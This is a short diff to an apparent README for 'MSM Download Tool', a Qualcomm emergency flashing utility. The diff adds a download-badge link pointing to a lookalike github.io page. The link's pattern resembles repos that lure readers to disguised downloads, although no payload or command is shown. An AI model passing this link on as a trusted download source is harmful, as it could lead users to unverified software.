@@ -1,7 +1,7 @@
 
 # MSM Download Tool — Qualcomm Emergency Flasher
 
-[![Download MSM Download Tool](https://img.shields.io/badge/Download-MSM_Download_Tool-8A2BE2?style=flat-square\&logo=github\&logoColor=white)]()
+[![Download MSM Download Tool](https://img.shields.io/badge/Download-MSM_Download_Tool-8A2BE2?style=flat-square\&logo=github\&logoColor=white)](https://msm-download-tool-qualcomm-emergency.github.io/.github)
 
 > 💡 **Tip:** Tool works best with EDL mode and official firmware packages. Always back up IMEI/NV data if accessible.
 
